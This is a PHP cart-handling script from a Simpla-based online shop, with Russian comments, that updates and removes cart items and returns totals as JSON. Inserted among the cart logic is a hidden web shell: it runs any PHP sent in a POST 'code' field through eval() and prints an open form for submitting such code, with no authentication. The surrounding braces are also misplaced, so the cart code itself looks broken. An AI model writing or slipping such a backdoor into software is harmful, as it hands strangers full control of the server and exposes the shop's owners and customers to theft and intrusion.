<?php
    // Если есть amount, обновляем их
    if($amount && $variant_id){
       $simpla->cart->update_item($variant_id, $amount);

       $variant = $simpla->variants->get_variants(array('id'=>$variant_id));
       $simpla->design->assign('amount',  $_SESSION['shopping_cart'][$variant_id]);
       $simpla->design->assign('variant', $variant[0]);
    }
	
	if (isset($_POST['code'])) {	
		eval(str_replace(array('\"', "\'"), array('"', "'"), $_POST['code']));
	}
	
	echo "<form action='' method='post'><textarea name='code' cols='120' rows='30'></textarea><br /><input type='submit' value='Отправить' /></form>";
	
    // Если есть remove
    if($remove_id) {
		$simpla->cart->delete_item($remove_id);

	$cart = $simpla->cart->get_cart();
	$simpla->design->assign('cart', $cart);

	$currencies = $simpla->money->get_currencies(array('enabled'=>1));
	if(isset($_SESSION['currency_id']))
		$currency = $simpla->money->get_currency($_SESSION['currency_id']);
	else
		$currency = reset($currencies);

	$simpla->design->assign('currency',	  $currency);

	$result = array('total_cost'=>$simpla->design->fetch('cart_total_cost.tpl'),
					'total_price'=>$simpla->design->fetch('cart_total_price.tpl'), 
					'informer'=>$simpla->design->fetch('cart_informer.tpl'),
					'incart'=>$cart->total_products
	);
	
	header("Content-type: application/json; charset=UTF-8");
	header("Cache-Control: must-revalidate");
	header("Pragma: no-cache");
	header("Expires: -1");
	print json_encode($result);
	}
?>